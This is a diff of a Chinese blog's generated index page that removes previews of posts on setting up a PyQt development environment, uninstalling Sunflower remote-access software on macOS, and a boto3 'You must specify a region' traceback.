-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/10/17.pyqt环境搭建/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="vsyour">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Openresty Python LUA">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/05/10/17.pyqt环境搭建/" itemprop="url">
-                  pyqt环境搭建
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-10T00:00:00+08:00">
-                2017-05-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2017/05/10/17.pyqt环境搭建/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2017/05/10/17.pyqt环境搭建/" class="cy_cmt_count" data-xid="2017/05/10/17.pyqt环境搭建/" itemprop="commentsCount" ></span>
-                </a>
-              
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>pyqt环境搭建<br>QQ群：397745473</p>
-<h1 id="python-版本选择"><a href="#python-版本选择" class="headerlink" title="python 版本选择"></a>python 版本选择</h1><p>.选择python 2.x</p>
-<h1 id="python-开发的easy-模式"><a href="#python-开发的easy-模式" class="headerlink" title="python 开发的easy 模式"></a>python 开发的easy 模式</h1><p>原生的idle并不好用.<br>可以选用ipython,支持自动补全.自动缩进,支持bash shell<br>内部很多有用的功能和函数.</p>
-<h2 id="pythonxy"><a href="#pythonxy" class="headerlink" title="pythonxy"></a>pythonxy</h2><p>集成python 科技计算包.如numpy,matplotlib,spyder<br>缺点:现在更新比较慢了.</p>
-<h2 id="python-EPD"><a href="#python-EPD" class="headerlink" title="python EPD"></a>python EPD</h2><p>商业版本,不建议用</p>
-<h2 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h2><p>建议使用<br>内部很多新版本的科学计算包,由python之父维护.<br>安装前卸载其他python解释器<br>下载地址:<a href="https://www.continuum.io/downloads/">https://www.continuum.io/downloads/</a><br>装完后再去pyqt官网下载一个重新安装pyqt.这样才能编译成功.<br>安装ERIC4   F2运行<br>安装</p>
-<h2 id="Eric4"><a href="#Eric4" class="headerlink" title="Eric4"></a>Eric4</h2><p>首次运行需配置环境</p>
-<h2 id="eclipse-pydev"><a href="#eclipse-pydev" class="headerlink" title="eclipse + pydev"></a>eclipse + pydev</h2><p>安装jdk,java运行环境<br>在eclipse中安装pydev<br>1.去官网下载eclipse<br>2.安装Pydev<br>输入网址,选第一个勾上就行了.<br>配置python解释器路径</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/10/17.pyqt环境搭建/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/10/19.MAC卸载向日葵/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="vsyour">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Openresty Python LUA">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/05/10/19.MAC卸载向日葵/" itemprop="url">
-                  mac os 卸载向日葵软件
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-10T00:00:00+08:00">
-                2017-05-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2017/05/10/19.MAC卸载向日葵/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2017/05/10/19.MAC卸载向日葵/" class="cy_cmt_count" data-xid="2017/05/10/19.MAC卸载向日葵/" itemprop="commentsCount" ></span>
-                </a>
-              
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>mac os 卸载向日葵软件<br>QQ群：397745473</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/10/19.MAC卸载向日葵/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://vksec.com/2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="vsyour">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://ww4.sinaimg.cn/small/937882b5jw1f4db4lroy9j20hs0npmy6.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Openresty Python LUA">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/" itemprop="url">
-                  使用aws亚马逊的boto3报错解决办法
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-10T00:00:00+08:00">
-                2017-05-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络安全/" itemprop="url" rel="index">
-                    <span itemprop="name">网络安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-comment-o"></i>
-              </span>
-              
-                <a href="/2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/#SOHUCS" itemprop="discussionUrl">
-                  <span id="url::http://vksec.com/2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/" class="cy_cmt_count" data-xid="2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/" itemprop="commentsCount" ></span>
-                </a>
-              
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>使用aws亚马逊的boto3报错解决办法<br>QQ群：397745473</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">C:\Python27\python.exe D:/python/test_boto3.py</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;D:/python/test_boto3.py&quot;, line 5, in &lt;module&gt;</div><div class="line">    client = boto3.client(&apos;ses&apos;)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\boto3\__init__.py&quot;, line 83, in client</div><div class="line">    return _get_default_session().client(*args, **kwargs)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\boto3\session.py&quot;, line 263, in client</div><div class="line">    aws_session_token=aws_session_token, config=config)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\session.py&quot;, line 836, in create_client</div><div class="line">    client_config=config, api_version=api_version)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 70, in create_client</div><div class="line">    verify, credentials, scoped_config, client_config, endpoint_bridge)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 224, in _get_client_args</div><div class="line">    verify, credentials, scoped_config, client_config, endpoint_bridge)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\args.py&quot;, line 45, in get_client_args</div><div class="line">    endpoint_url, is_secure, scoped_config)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\args.py&quot;, line 103, in compute_client_args</div><div class="line">    service_name, region_name, endpoint_url, is_secure)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 297, in resolve</div><div class="line">    service_name, region_name)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\regions.py&quot;, line 122, in construct_endpoint</div><div class="line">    partition, service_name, region_name)</div><div class="line">  File &quot;C:\Python27\lib\site-packages\botocore\regions.py&quot;, line 135, in _endpoint_for_partition</div><div class="line">    raise NoRegionError()</div><div class="line">botocore.exceptions.NoRegionError: You must specify a region.</div></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/10/16.python 使用aws亚马逊的boto3报错解决办法/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
@@ -1895,7 +1885,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
